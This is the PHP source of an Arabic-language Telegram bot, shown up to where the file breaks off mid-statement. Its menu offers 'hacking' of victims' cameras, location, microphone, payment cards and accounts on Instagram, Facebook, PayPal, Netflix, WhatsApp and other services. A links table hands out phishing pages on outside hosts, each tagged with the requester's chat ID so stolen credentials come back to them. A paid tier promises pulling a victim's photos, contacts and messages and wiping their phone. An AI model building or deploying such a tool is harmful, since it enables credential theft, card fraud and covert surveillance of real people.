<?php
header('Content-Type: text/html; charset=utf-8');
mb_internal_encoding("UTF-8");

// =================== [ الإعدادات الأساسية ] ===================
$admin = 7145036494; // آيدي الأدمن الأساسي
$ADMIN_ID = $admin;
$token = getenv("BOT_TOKEN") ?: "ضع_توكنك_هنا";
$checkToken = 

define('API_KEY', $token);
define("API_URL", "https://api.telegram.org/bot".API_KEY."/");

if (!is_dir("database")) mkdir("database", 0777, true);

// =================== [ الدوال الأساسية ] ===================
function bot($method, $datas = []) {
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        return null;
    } else {
        return json_decode($res);
    }
}

function sendRequest($method, $data = []) {
    $ch = curl_init(API_URL . $method);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

function sendmessage($chat_id, $text){
    bot('sendMessage',[
        'chat_id'=>$chat_id,
        'text'=>$text,
        'parse_mode'=>"MarkDown"
    ]);
} 

function sendphoto($chat_id, $photo, $caption=""){
    bot('sendphoto',[
        'chat_id'=>$chat_id,
        'photo'=>$photo,
        'caption'=>$caption,
    ]);
}

function sendsticker($chat_id,$sticker_id,$caption=""){
    bot('sendsticker',[
        'chat_id'=>$chat_id,
        'sticker'=>$sticker_id,
        'caption'=>$caption
    ]);
} 

function getUser($uid){
    $file = "database/$uid.json";
    if(file_exists($file)){
        return json_decode(file_get_contents($file), true);
    }
    return ["balance"=>0, "points"=>10];
}

function saveUser($uid, $data){
    file_put_contents("database/$uid.json", json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
}

// دالة التحقق من الاشتراك
function checkSubscription($user_id, $channel) {
    global $checkToken;
    $cleanChannel = ltrim(trim($channel), '@');
    if (empty($cleanChannel)) return true;
    $res = file_get_contents("https://api.telegram.org/bot$checkToken/getChatMember?chat_id=@$cleanChannel&user_id=$user_id");
    $result = json_decode($res, true);
    if (isset($result['result']['status'])) {
        $status = $result['result']['status'];
        return in_array($status, ['member', 'creator', 'administrator']);
    }
    return false;
}

// =================== [ استقبال التحديثات ] ===================
$input = file_get_contents('php://input');
$update = json_decode($input, true);

$message = $update['message'] ?? null;
$callback = $update['callback_query'] ?? null;

if ($message) {
    $chat_id = $message['chat']['id'];
    $user_id = $message['from']['id'];
    $text = $message['text'] ?? '';
    $name = $message['from']['first_name'] ?? '';
    $username = $message['from']['username'] ?? '';
    $message_id = $message['message_id'];
} elseif ($callback) {
    $chat_id = $callback['message']['chat']['id'];
    $user_id = $callback['from']['id'];
    $data = $callback['data'] ?? '';
    $query_id = $callback['id'];
    $message_id = $callback['message']['message_id'];
    $name = $callback['from']['first_name'] ?? '';
    $username = $callback['from']['username'] ?? '';
    $text = '';
} else {
    exit;
}

$chat_id2 = $chat_id;
$id = $user_id;

// =================== [ قاعدة بيانات المشتركين والتنبيهات ] ===================
$membersFile = "database/ID.txt";
$u = file_exists($membersFile) ? array_filter(explode("\n", file_get_contents($membersFile))) : [];
$c = count($u);

if (!in_array($user_id, $u)) {
    file_put_contents($membersFile, $user_id . "\n", FILE_APPEND);
    $tn = file_exists("database/tnb.txt") ? file_get_contents("database/tnb.txt") : "on";
    if ($tn == "on" && $user_id != $admin) {
        $c_new = $c + 1;
        bot('sendMessage', [
            'chat_id' => $admin,
            'text' => "🔔 *تنبيه: مستخدم جديد انضم إلى البوت الخاص بك!*\n👨‍💼¦ اسمه » [$name](tg://user?id=$id)\n🔱¦ معرفه » [@$username](tg://user?id=$id)\n💳¦ ايديه » [$id](tg://user?id=$id)\n📊 *عدد الأعضاء الكلي:* $c_new",
            'parse_mode' => "MarkDown",
        ]);
    }
}

// فحص الحظر
$banFile = "database/ban.txt";
$exb = file_exists($banFile) ? array_filter(explode("\n", file_get_contents($banFile))) : [];
if (in_array($user_id, $exb) && $user_id != $admin) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "انت محظور من قبل المطور لايمكنك استخدام البوت📛",
    ]);
    exit;
}

// فحص توقف البوت
$obot = file_exists("database/bot1.txt") ? file_get_contents("database/bot1.txt") : "on";
if ($obot == "off" && $user_id != $admin) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "بوت متوقف حاليا لاغراض خاصه 🚨🚧",
    ]);
    exit;
}

// فحص الوضع المدفوع
$vip = file_exists("database/vip.txt") ? file_get_contents("database/vip.txt") : "off";
$vip123 = file_exists("database/vip123.txt") ? file_get_contents("database/vip123.txt") : "";
$vip2 = explode("\n", $vip123);

if ($vip == "on" && !in_array($id, $vip2) && $user_id != $admin) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "مرحبًا بكم! 🌟\n\nللاستفادة الكاملة من جميع ميزات وخدمات بوتنا المتقدمة، يُرجى تفعيل البوت من خلال شراء الاشتراك. ⚙️✨\n\nنحن نعمل بجد لضمان تقديم تجربة فريدة ومميزة لكم. 🚀\n\nشكراً لثقتكم بنا. 😊",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "شراء الاشتراك", 'url' => "tg://user?id=$admin"]],
            ]
        ])
    ]);
    exit;
}

// =================== [ نظام الاشتراك الإجباري ] ===================
$my_channel_link = "https://t.me/+l20CWCyobz5mZDdk"; // قناتك

if ($user_id != $admin) {
    $chFile = "database/bot.txt";
    $channels = file_exists($chFile) ? array_filter(explode("\n", file_get_contents($chFile))) : [];
    
    // إضافة القناة الأساسية
    if (!in_array("hkrroe2", $channels)) {
        $channels[] = "hkrroe2";
    }

    $notSubscribedChannels = [];
    foreach ($channels as $channel) {
        if (!checkSubscription($user_id, $channel)) {
            $notSubscribedChannels[] = ltrim(trim($channel), '@');
        }
    }

    if (!empty($notSubscribedChannels)) {
        $keyboard = ['inline_keyboard' => []];
        $message_text = "⚠️ عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدام الخدمات.\n\nالمطور: @$admin\n\n";

        // الزر القناة الخاصة بك
        $keyboard['inline_keyboard'][] = [
            ['text' => "اضغط هنا للاشتراك في القناة 📢", 'url' => $my_channel_link]
        ];

        foreach ($notSubscribedChannels as $ch) {
            if ($ch != "hkrroe2") {
                $keyboard['inline_keyboard'][] = [
                    ['text' => "اشترك في @$ch 📢", 'url' => "https://t.me/$ch"]
                ];
            }
        }

        $keyboard['inline_keyboard'][] = [
            ['text' => "تم الاشتراك ✅ تحقق الآن", 'callback_data' => "check_sub"]
        ];

        $message_text .= "📢 بعد إتمام الاشتراك، اضغط زر التحقق أو أرسل \"/start\" للمتابعة.";

        if ($callback && $data == "check_sub") {
            bot('answerCallbackQuery', [
                'callback_query_id' => $query_id,
                'text' => '❌ لم تشترك في جميع القنوات بعد!',
                'show_alert' => true
            ]);
        }

        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => $message_text,
            'reply_markup' => json_encode($keyboard)
        ]);
        exit;
    }
}

if ($callback && $data == "check_sub") {
    bot('answerCallbackQuery', ['callback_query_id' => $query_id, 'text' => '✅ تم التحقق، مرحباً بك!']);
    $data = "main_start";
}

// =================== [ لوحة تحكم الأدمن ] ===================
$sajad = file_exists("database/rembo.txt") ? file_get_contents("database/rembo.txt") : "";

if (($text == '/admin' || $data == 'oooo') && $id == $admin) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "مرحبًا! إليك أوامرك: ⚡📮\n\n1. إدارة المشتركين والتحكم بهم.\n2. إرسال إذاعات ورسائل موجهة.\n3. ضبط إعدادات الاشتراك الإجباري.\n4. تفعيل أو تعطيل التنبيهات.\n5. إدارة حالة البوت ووضع الاشتراك.",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "المشتركين 👥", 'callback_data' => "m1"]],
                [['text' => "إذاعة رسالة 📮", 'callback_data' => "send"], ['text' => "توجيه رسالة 🔄", 'callback_data' => "forward"]],
                [['text' => "وضع اشتراك إجباري 💢", 'callback_data' => "ach"], ['text' => "حذف اشتراك إجباري 🔱", 'callback_data' => "dch"]],
                [['text' => 'تحديثات البوت 🔴', 'url' => 'https://t.me/DA4K711']], 
                [['text' => "تفعيل التنبيه ✔️", 'callback_data' => "ons"], ['text' => "تعطيل التنبيه ❎", 'callback_data' => "ofs"]],
                [['text' => "فتح البوت ✅", 'callback_data' => "obot"], ['text' => "إيقاف البوت ❌", 'callback_data' => "idoeoeoeoeoeoskkskwkskskskkskskdkdkdkdkkd"]],
                [['text' => "وضع المدفوع 💰", 'callback_data' => "pro"], ['text' => "وضع المجاني 🆓", 'callback_data' => "frre"]],
                [['text' => "اظافه عظو مدفوع 💰", 'callback_data' => "pro123"], ['text' => "ازاله عظو مدفوع 🆓", 'callback_data' => "frre123"]],
                [['text' => "حظر عضو 🚫", 'callback_data' => "ban"], ['text' => "إلغاء حظر عضو ❌", 'callback_data' => "unban"]],
            ]
        ])
    ]);
    @unlink("database/rembo.txt");
    exit;
}

// إجراءات لوحة الأدمن
if ($id == $admin) {
    if ($data == "m1") {
        $m1 = count($u);
        bot('answercallbackquery', [
            'callback_query_id' => $query_id,
            'text' => "عدد المشترڪين هو » $m1 «",
            'show_alert' => true,
        ]);
    } elseif ($data == "unban") {
        bot('editmessagetext', [
            'chat_id' => $chat_id2, 
            'message_id' => $message_id,
            'text' => "حسنا عزيزي ارسل ايدي العضو لالغاء حظره🔱", 
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "الغاء الامر❎", 'callback_data' => "oooo"]]]])
        ]);
        file_put_contents("database/rembo.txt", "unban");
    } elseif ($text && $sajad == "unban") {
        $bn = file_get_contents("database/ban.txt");
        $bn = str_replace($text, '', $bn);
        file_put_contents("database/ban.txt", $bn);
        unlink("database/rembo.txt");
        bot('sendmessage', ['chat_id' => $chat_id, 'text' => "تم الغاء حظر العضور بنجاح✅"]);
        bot('SendMessage', ['chat_id' => $text, 'text' => "تم الغاء حظرك من البوت🤩"]);
    } elseif ($data == "ban") {
        bot('editmessagetext', [
            'chat_id' => $chat_id2, 
            'message_id' => $message_id,
            'text' => "حسنا عزيزي ارسل ايدي العضو لاحظره🤩", 
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "الغاء الامر❎", 'callback_data' => "oooo"]]]])
        ]);
        file_put_contents("database/rembo.txt", "ban");
    } elseif ($text && $sajad == "ban") {
        file_put_contents("database/ban.txt", $text . "\n", FILE_APPEND);
        unlink("database/rembo.txt");
        bot('sendmessage', ['chat_id' => $chat_id, 'text' => "تم حظر العضور بنجاح✅"]);
        bot('SendMessage', ['chat_id' => $text, 'text' => "تم حظرك من قبل المطور لايمكنك استخدام البوت😒"]);
    } elseif ($data == "idoeoeoeoeoeoskkskwkskskskkskskdkdkdkdkkd") {
        file_put_contents("database/bot1.txt", "off");
        bot('editmessagetext', ['chat_id' => $chat_id2, 'message_id' => $message_id, 'text' => "تم اغلاق البوت✅"]);
    } elseif ($data == "obot") {
        unlink("database/bot1.txt");
        bot('editmessagetext', ['chat_id' => $chat_id2, 'message_id' => $message_id, 'text' => "تم فتح البوت بنجاح✅"]);
    } elseif ($data == "send") {
        bot('editmessagetext', [
            'chat_id' => $chat_id2, 
            'message_id' => $message_id,
            'text' => "حسنا عزيزي ارسل رسالتك📮", 
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "الغاء الامر❎", 'callback_data' => "oooo"]]]])
        ]);
        file_put_contents("database/rembo.txt", "send");
    } elseif ($text && $sajad == "send") {
        unlink("database/rembo.txt");
        bot("sendmessage", ["chat_id" => $chat_id, "text" => '-تم النشر بنجاح✔️']);
        foreach ($u as $user_target) {
            bot('sendMessage', ['chat_id' => trim($user_target), 'text' => $text]);
        }
    } elseif ($data == "forward") {
        bot('editmessagetext', [
            'chat_id' => $chat_id2, 
            'message_id' => $message_id,
            'text' => "حسنا عزيزي قم بتوجيه الرسالة✅", 
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "الغاء الامر❎", 'callback_data' => "oooo"]]]])
        ]);
        file_put_contents("database/rembo.txt", "forward");
    } elseif ($message && $sajad == "forward") {
        unlink("database/rembo.txt");
        bot("sendmessage", ["chat_id" => $chat_id, "text" => 'تم التوجيه بنجاح🔰']);
        foreach ($u as $user_target) {
            bot('forwardMessage', ['chat_id' => trim($user_target), 'from_chat_id' => $chat_id, 'message_id' => $message_id]);
        }
    } elseif ($data == "ach") {
        bot('editmessagetext', [
            'chat_id' => $chat_id2, 
            'message_id' => $message_id,
            'text' => "حسنا عزيزي ارسل معرف قناتك 📮", 
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "الغاء الامر❎", 'callback_data' => "oooo"]]]])
        ]);
        file_put_contents("database/rembo.txt", "ch");
    } elseif ($text && $sajad == "ch") {
        unlink("database/rembo.txt");
        file_put_contents("database/bot.txt", $text . "\n", FILE_APPEND);
        bot('sendmessage', ['chat_id' => $chat_id, 'text' => "تم وضع اشتراك اجباري😁"]);
    } elseif ($data == "dch") {
        bot('editmessagetext', [
            'chat_id' => $chat_id2, 
            'message_id' => $message_id,
            'text' => "ارسل معرف القناه لازالتها من الاشتراك الاجباري", 
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "الغاء الامر❎", 'callback_data' => "oooo"]]]])
        ]);
        file_put_contents("database/rembo.txt", "dch");
    } elseif ($text && $sajad == "dch") {
        unlink("database/rembo.txt");
        $botn = file_get_contents("database/bot.txt");
        $botn = str_replace($text, '', $botn);
        file_put_contents("database/bot.txt", $botn);
        bot('sendmessage', ['chat_id' => $chat_id, 'text' => "تم مسح القناه من الاشتراك الاجباري"]);
    } elseif ($data == "pro123") {
        file_put_contents("database/rembo.txt", "pro123");
        bot('sendMessage', ['chat_id' => $chat_id, 'text' => "قم بارسال ايدي الشخص مراد اظافته بقسم مدفوع"]);
    } elseif ($text && $sajad == "pro123") {
        unlink("database/rembo.txt");
        file_put_contents("database/vip123.txt", $text . "\n", FILE_APPEND);
        bot('sendmessage', ['chat_id' => $chat_id, 'text' => "تم اظافته في وضع مدفوع"]);
    } elseif ($data == "frre123") {
        file_put_contents("database/rembo.txt", "frre123");
        bot('sendMessage', ['chat_id' => $chat_id, 'text' => "ارسل ايدي شخص مراد ازالته من الاشتراك مدفوع"]);
    } elseif ($text && $sajad == "frre123") {
        unlink("database/rembo.txt");
        $botn = file_get_contents("database/vip123.txt");
        $botn = str_replace($text, '', $botn);
        file_put_contents("database/vip123.txt", $botn);
        bot('sendmessage', ['chat_id' => $chat_id, 'text' => "تم ازالته من الاشتراك مدفوع"]);
    } elseif ($data == "ofs") {
        unlink("database/tnb.txt");
        bot('editmessagetext', ['chat_id' => $chat_id2, 'message_id' => $message_id, 'text' => "تم تعطيل التنبيه بنجاح✅"]);
    } elseif ($data == "ons") {
        file_put_contents("database/tnb.txt", "on");
        bot('editmessagetext', ['chat_id' => $chat_id2, 'message_id' => $message_id, 'text' => "تم تفعيل التنبيه بنجاح✅"]);
    } elseif ($data == "pro") {
        file_put_contents("database/vip.txt", "on");
        bot('editmessagetext', ['chat_id' => $chat_id2, 'message_id' => $message_id, 'text' => "تم جعل البوت بوضع المدفوع 💼"]);
    } elseif ($data == "frre") {
        unlink("database/vip.txt");
        bot('editmessagetext', ['chat_id' => $chat_id2, 'message_id' => $message_id, 'text' => "تم جعل البوت بوضع المجاني 😊"]);
    }
}

// =================== [ الأزرار والخدمات الأساسية ] ===================

$main_keyboard = json_encode([
    'inline_keyboard' => [                 
        [
            ['text' => 'تلغيم رابط👿', 'callback_data' => 'exi2'],
            ['text' => 'روابط مزوره☠️', 'callback_data' => 'exit3']
        ],
        [
            ['text' => 'اختراق الكامرا الأمامية 🔥', 'callback_data' => 'com'],
            ['text' => 'اختراق الكامرا الخلفية 📷', 'callback_data' => 'co']
        ],
        [
            ['text' => 'اختراق الموقع 📌', 'callback_data' => 'moq'],
            ['text' => 'تسجيل صوت الضحية 🎤', 'callback_data' => 'record_audio']
        ],
        [
            ['text' => 'تصوير الضحية فيديو 🎥', 'callback_data' => 'com1'],
            ['text' => 'جمع معلومات الجهاز 🧾', 'callback_data' => 'ma']
        ],
        [
            ['text' => 'الارقام وهميه ☎️', 'callback_data' => 'fake_number'],
            ['text' => 'اختراق الهاتف كاملاً 🚨', 'callback_data' => 'full_device']
        ],
        [
            ['text' => 'صيد فيزات 💳', 'callback_data' => 'get_fake_visa'],
            ['text' => 'أعطيني نكتة 😂', 'callback_data' => 'send_joke']
        ],
        [
            ['text' => 'اختراق قنوات التلفاز 📺', 'callback_data' => 'tv_channels'],
            ['text' => 'اختراق بث الراديو 📻', 'callback_data' => 'hack_radio']
        ],
        [
            ['text' => 'اختراق انستجرام 🆔', 'callback_data' => 'send_instagram_link'],
            ['text' => 'اختراق فري فاير 💎', 'callback_data' => 'send_freefire_link']
        ],
        [
            ['text' => 'اختراق ببجي 🎮', 'callback_data' => 'send_adobe_link'],
            ['text' => 'اختراق فيسبوك 🔮', 'callback_data' => 'send_spotify_link']
        ],
        [
            ['text' => 'اختراق ديسكورد 🔥', 'callback_data' => 'send_google2_link'],
            ['text' => 'اغلاق المواقع 🔱', 'web_app' => ['url' => 'https://brass-comfortable-ricotta.glitch.me/']]
        ],
        [
            ['text' => 'الذكاء الاصطناعي 🤖', 'web_app' => ['url' => 'https://sparkly-liger-751b2d.netlify.app/']],
            ['text' => 'اختراق باي بال 💲', 'callback_data' => 'send_paypal_link']
        ],
        [
            ['text' => 'اختراق نتفليكس 🔴', 'callback_data' => 'send_netflix_link'],
            ['text' => 'معرفة رقم الضحية ☎️', 'callback_data' => 'get_user_link']
        ],
        [
            ['text' => 'اختراق جوجل 🔍', 'callback_data' => 'send_google_link'],
            ['text' => 'اختراق تيك توك 🚫', 'callback_data' => 'send_tiktok_link']
        ],
        [
            ['text' => 'اختراق كواي 🚬', 'callback_data' => 'kwai'],
            ['text' => 'اختراق واتساب 🟡', 'callback_data' => 'wats']
        ],
        [
            ['text' => 'اختراق ووردبريس 📝', 'callback_data' => 'send_wordpress_link'],
            ['text' => 'اختراق يوتيوب 🔴', 'callback_data' => 'verify_number']
        ],
        [
            ['text' => 'اختراق سناب شات 📀', 'callback_data' => 'send_twitch_link'],
            ['text' => 'اختراق تويتر 🐦', 'callback_data' => 'send_twitter_link']
        ],
        [
            ['text' => 'اختراق روبليكس 🎮', 'callback_data' => 'send_roblox_link'],
            ['text' => ' تحليل شخصيتك🚸', 'callback_data' => 'pm']
        ],
        [
            ['text' => 'فتح شات واتساب ✳️ ️', 'callback_data' => 'search_whatsapp_number'],
            ['text' => 'بحث حساب عبر id🔍 ', 'callback_data' => 'search_telegram_id']
        ],
        [
            ['text' => 'تتواصل مع المطور', 'url' => "tg://user?id=$admin"]
        ]
    ]
]);

if ($text == "/start" || $data == "main_start") {
    @unlink("database/$chat_id/database.txt");
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🤖✨**مرحبا بك جميع الازرار مجانا 😊**",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => $main_keyboard
    ]);
}

if ($text == "/vip") {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "مرحبًا! \nهذه الخيارات مدفوعة بسعر 15 نقطة. \nيمكنك تجميع النقاط وفتحها مجانًا.\n\n🔹 ارسل /ng_wahm لعرض عدد نقاطك وعرض رابط الدعوة الخاص بك.",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'سحب جميع صور الهاتف عبر رابط🔒', 'callback_data' => 'vip_photos'], ['text' => 'سحب جميع الرقام الضحيه عبر رابط🔒', 'callback_data' => 'vip_video']],
                [['text' => 'سحب جميع رسايل الضحيه عبر رابط🔒', 'callback_data' => 'vip_messages'], ['text' => 'فرمتة جوال الضحيه عبر رابط🔒', 'callback_data' => 'vip_phone']],
                [['text' => 'اختراق عبر صوره🔒', 'callback_data' => 'vip_file'], ['text' => 'اختراق عبر ملف🔒', 'callback_data' => 'vip_number']],
                [['text' => 'كشف شكل البوت', 'callback_data' => 'xm16']],
                [['text' => 'شراء البوت  (15 نقطة)', 'callback_data' => 'mm16']]
            ]
        ])
    ]);
}

// قنوات التلفزيون
$arabic_channels = [
    "السعودية 🇸🇦" => "https://www.ksa-tv.live/",
    "الإمارات 🇦🇪" => "https://www.emarat-tv.ae/live/",
    "مصر 🇪🇬" => "https://www.nileinternational.net/live/",
    "العراق 🇮🇶" => "https://www.alsumaria.tv/live",
    "سوريا 🇸🇾" => "https://www.ortas.online/",
    "لبنان 🇱🇧" => "https://www.mtv.com.lb/Live",
    "الأردن 🇯🇴" => "https://www.jrtv.gov.jo/live",
    "الكويت 🇰🇼" => "https://www.kwtv.gov.kw/",
    "البحرين 🇧🇭" => "https://www.bahrain-tv.com/",
    "عمان 🇴🇲" => "https://www.oman-tv.gov.om/live/",
    "قطر 🇶🇦" => "https://www.aljazeera.net/live",
    "اليمن 🇾🇪" => "https://www.yementv.tv/",
    "ليبيا 🇱🇾" => "https://www.libya.tv/live/",
    "السودان 🇸🇩" => "https://www.sudantv.sd/",
    "الجزائر 🇩🇿" => "https://www.entv.dz/live/",
    "المغرب 🇲🇦" => "https://www.2m.ma/en/live/",
    "تونس 🇹🇳" => "https://www.watania1.tn/live",
    "فلسطين 🇵🇸" => "https://www.pbc.ps/live",
    "موريتانيا 🇲🇷" => "https://www.tvm.mr/",
    "الصومال 🇸🇴" => "https://www.sntv.so/",
    "جيبوتي 🇩🇯" => "https://www.rtd.dj/",
    "جزر القمر 🇰🇲" => "https://www.rtnc.km/"
];

if ($data == "zakhrafa_name") {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "أرسل اسمك لزخرفته بالإنجليزي:",
    ]);
    file_put_contents("zakhrafa_step.txt", $chat_id2);
}

if ($data == "tv_channels") {
    $buttons = [];
    $row = [];
    foreach ($arabic_channels as $country => $link) {
        $row[] = ['text' => $country, 'callback_data' => "channel_" . md5($country)];
        if (count($row) == 3) {
            $buttons[] = $row;
            $row = [];
        }
    }
    if (!empty($row)) {
        $buttons[] = $row;
    }
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "اختر الدولة لااختراق قناة تلفزيونية مباشرة:",
        'reply_markup' => json_encode(['inline_keyboard' => $buttons])
    ]);
}

foreach ($arabic_channels as $country => $link) {
    if ($data == "channel_" . md5($country)) {
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "اختراق بث مباشر  من قناة *$country*:\n$link",
            'parse_mode' => "Markdown"
        ]);
    }
}

if ($data == "special_bot") {
    $points_file = "nqat_wahm.json";
    $points_data = file_exists($points_file) ? json_decode(file_get_contents($points_file), true) : [];
    $user_points = isset($points_data[$user_id]) ? $points_data[$user_id] : 0;

    if ($user_points >= 30) {
        $points_data[$user_id] = $user_points - 30;
        file_put_contents($points_file, json_encode($points_data, JSON_PRETTY_PRINT));
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "🎉 تم شراء البوت المتميز بنجاح!\n✅ تم خصم 30 نقطة من رصيدك.",
            'parse_mode' => "Markdown"
        ]);
    } else {
        $invite_link = "https://t.me/WAHM_REBOT?start=$user_id";
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "❗️ليس لديك نقاط كافية لشراء البوت.\n\n🚀 اجمع نقاط من خلال دعوة أصدقائك:\n$invite_link",
            'parse_mode' => "Markdown"
        ]);
    }
}

// قائمة الروابط
$links = [
    'send_pubg_link' => "https://smmyemen.pro/bots/wahm1954/GLACIER(PUBG)/index.php?ID=$chat_id2",
    'send_pubg2_link' => "https://smmyemen.pro/bots/wahm1954/SPIN/index.php?ID=$chat_id2",
    'send_pubg3_link' => "https://smmyemen.pro/bots/wahm1954/MIDASBUY(OLDxPUBG)/index.php?ID=$chat_id2",
    'send_adobe_link' => "https://smmyemen.pro/bots/wahm1954/index3.html?id=$chat_id2",
    'send_facebook_link' => "https://separated-brawny-odometer.glitch.me?ID=$chat_id2",
    'send_discord_link' => "https://trite-tough-earthquake.glitch.me?id=$chat_id2",
    'send_paypal_link' => "https://smmyemen.pro/bots/wahm1954/index2.html?id=$chat_id2",
    'send_netflix_link' => "https://smmyemen.pro/bots/wahm1954/index17.html?id=$chat_id2",
    'send_instagram_link' => "https://smmyemen.pro/bots/wahm1954/index1.html?id=$chat_id2",
    'send_google_link' => "https://smmyemen.pro/bots/wahm1954/index9.html?id=$chat_id2",
    'send_google2_link' => "https://smmyemen.pro/bots/wahm1954/index10.html?id=$chat_id2",
    'send_badoo_link' => "https://smmyemen.pro/bots/wahm1954/badoo/index.php?ID=$chat_id2",
    'send_messenger_link' => "https://smmyemen.pro/bots/wahm1954/fb_messenger/index.php?ID=$chat_id2",
    'send_github_link' => "https://smmyemen.pro/bots/wahm1954/github/index.php?ID=$chat_id2",
    'send_gitlab_link' => "https://smmyemen.pro/bots/wahm1954/gitlab/index.php?ID=$chat_id2",
    'send_ebay_link' => "https://smmyemen.pro/bots/wahm1954/ebay/index.php?ID=$chat_id2",
    'send_deviantart_link' => "https://smmyemen.pro/bots/wahm1954/deviantart/index.php?ID=$chat_id2",
    'send_ig_followers_link' => "https://smmyemen.pro/bots/wahm1954/ig_followers/index.php?ID=$chat_id2",
    'wats' => "https://smmyemen.pro/bots/wahm1954/index18.html?id=$chat_id2",
    'kwai' => "https://smmyemen.pro/bots/wahm1954/index15.html?id=$chat_id2",
    'send_tiktok_link' => "https://smmyemen.pro/bots/wahm1954/index8.html?id=$chat_id2",
    'send_twitter_link' => "https://smmyemen.pro/bots/wahm1954/index7.html?id=$chat_id2",
    'send_twitch_link' => "https://smmyemen.pro/bots/wahm1954/index12.html?id=$chat_id2",
    'send_wordpress_link' => "https://smmyemen.pro/bots/wahm1954/index19.html?id=$chat_id2",
    'send_roblox_link' => "https://smmyemen.pro/bots/wahm1954/index11.html?id=$chat_id2",
    'send_snapchat_link' => "https://sable-peat-zircon.glitch.me?id=$chat_id2",
    'send_microsoft_link' => "https://smmyemen.pro/bots/wahm1954/microsoft/index.php?ID=$chat_id2",
    'send_spotify_link' => "https://smmyemen.pro/bots/wahm1954/index14.html?id=$chat_id2",
    'send_freefire_link' => "https://smmyemen.pro/bots/wahm1954/index13.html?id=$chat_id2",
    'send_freefire2_link' => "https://smmyemen.pro/bots/wahm1954/FREEFIRE2/index.php?ID=$chat_id2",
];

if (isset($links[$data])) {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "تم إنشاء الرابط: \n" . $links[$data]
    ]);
}

// سكرين الشاشة
if ($data == "screen") {
    $keyboard = json_encode([
        "inline_keyboard" => [
            [["text" => "📡 قناة", "callback_data" => "screen_channel"]],
            [["text" => "👤 حساب", "callback_data" => "screen_account"]],
            [["text" => "👥 مجموعة", "callback_data" => "screen_group"]],
            [["text" => "🤖 بوت", "callback_data" => "screen_bot"]]
        ]
    ]);
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "📸 اختر نوع الحساب الذي تريد أخذ لقطة شاشة له:",
        'reply_markup' => $keyboard
    ]);
} elseif (strpos($data, "screen_") !== false) {
    $type = str_replace("screen_", "", $data);
    $types = [
        "channel" => "📡 قناة",
        "account" => "👤 حساب",
        "group" => "👥 مجموعة",
        "bot" => "🤖 بوت"
    ];
    file_put_contents("screen_type_$chat_id2.txt", $type);
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "🔍 أرسل الآن آيدي المستخدم الخاص بـ " . $types[$type] . " (مثلاً: 123456789)."
    ]);
} elseif ($text && is_numeric($text) && file_exists("screen_type_$chat_id2.txt")) {
    $target_user_id = $text;
    $type = file_get_contents("screen_type_$chat_id2.txt");
    unlink("screen_type_$chat_id2.txt");

    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "⏳ جاري أخذ لقطة شاشة للملف الشخصي..."
    ]);
    sleep(2);

    $user_info = bot('getChat', ['chat_id' => $target_user_id]);

    if ($user_info && isset($user_info->ok) && $user_info->ok) {
        $photo = bot('getUserProfilePhotos', [
            'user_id' => $target_user_id,
            'limit' => 1
        ]);

        if ($photo && isset($photo->ok) && $photo->ok && count($photo->result->photos) > 0) {
            $file_id2 = $photo->result->photos[0][1]->file_id ?? $photo->result->photos[0][0]->file_id;
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [["text" => "✅ تأكيد", "callback_data" => "confirm_screen_$target_user_id"]],
                    [["text" => "❌ لا", "callback_data" => "cancel_screen"]]
                ]
            ]);

            bot('sendPhoto', [
                'chat_id' => $chat_id2,
                'photo' => $file_id2,
                'caption' => "📸 لقطة شاشة للملف الشخصي\n\nآيدي المستخدم: `$target_user_id`",
                'parse_mode' => "Markdown",
                'reply_markup' => $keyboard
            ]);
        } else {
            bot('sendMessage', [
                'chat_id' => $chat_id2,
                'text' => "⚠️ لم يتم العثور على صورة للملف الشخصي."
            ]);
        }
    } else {
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "❌ لم أتمكن من جلب معلومات الحساب، تأكد أن الآيدي صحيح."
        ]);
    }
} elseif (strpos($data, "confirm_screen_") !== false) {
    $uid = str_replace("confirm_screen_", "", $data);
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "✅ تم تأكيد لقطة الشاشة للآيدي $uid بنجاح!"
    ]);
} elseif ($data == "cancel_screen") {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "❌ تم إلغاء العملية."
    ]);
}

if ($data == 'full_device') {
